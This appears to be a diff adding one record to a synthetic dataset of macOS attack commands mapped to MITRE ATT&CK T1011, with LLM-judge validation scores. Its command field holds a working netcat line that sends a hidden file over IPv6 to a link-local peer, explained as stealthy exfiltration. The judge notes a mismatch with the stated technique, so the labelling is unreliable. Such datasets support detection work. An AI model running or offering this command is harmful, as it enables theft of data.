@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -s \"$(ipconfig getv6ifaddr en5)\" \"fe80::2:abcd:7%en5\" 53127 < /Users/Shared/.cache.bin",
+  "explanation": "Forces exfiltration over a non-primary, often dormant USB/Thunderbolt Ethernet adapter (en5) via IPv6 TCP on an uncommon port, consistent with T1011 by using an alternate physical medium.",
+  "rationale_steps": [
+    "Use ipconfig to fetch the IPv6 address of the auxiliary Ethernet interface en5.",
+    "Bind netcat's source to en5's address to avoid the primary network path.",
+    "Exfiltrate data over IPv6 TCP to a link-local peer on a high-numbered port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-3cfd2e08",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with valid nc flags (-6, -s), balanced quoting (including zone index), and correct input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "Binds to the en5 IPv6 address and sends the file over TCP to a link-local peer on an uncommon port, aligning with the exfiltration intent (though it does not match the provided 'System Script Proxy Execution' technique description and assumes en5/listener availability).",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T21:44:02.167573Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
